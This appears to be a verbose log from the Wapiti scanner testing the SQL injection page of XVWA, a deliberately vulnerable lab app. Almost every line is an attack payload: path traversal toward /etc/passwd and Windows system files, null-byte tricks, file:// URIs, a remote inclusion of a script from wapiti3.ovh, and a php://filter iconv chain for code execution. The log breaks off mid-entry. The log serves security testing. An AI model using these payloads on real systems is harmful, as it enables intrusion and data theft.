+2024-03-20 15:24:17.439 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:17.457 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:17.472 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:17.490 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 15:24:17.507 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 15:24:17.522 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 15:24:17.540 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 15:24:17.556 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 15:24:17.571 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 15:24:17.588 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:17.605 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:17.634 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:17.639 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&item=10
+2024-03-20 15:24:17.655 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&item=10
+2024-03-20 15:24:17.672 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:17.689 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:17.705 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%2Fetc%2Fservices&item=10
+2024-03-20 15:24:17.721 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:17.737 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&item=10
+2024-03-20 15:24:17.752 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&item=10
+2024-03-20 15:24:17.769 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&item=10
+2024-03-20 15:24:17.785 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:17.799 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:17.813 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&item=10
+2024-03-20 15:24:17.828 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&item=10
+2024-03-20 15:24:17.845 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&item=10
+2024-03-20 15:24:17.857 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:17.873 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:17.890 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:17.907 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:17.922 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:17.939 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:17.956 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:17.973 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:17.989 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.006 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.022 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.040 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.058 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&item=10
+2024-03-20 15:24:18.076 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:18.091 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:18.104 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:18.117 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:18.133 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.147 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.161 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.175 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.187 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.196 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.205 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.214 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.224 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:18.237 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:18.249 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:18.258 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:18.269 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.283 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.293 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.304 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.317 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.328 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.339 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.349 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.358 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=file%3A%2F%2F%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:18.369 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&item=10
+2024-03-20 15:24:18.378 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:18.388 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:18.397 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.408 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.422 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:18.435 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
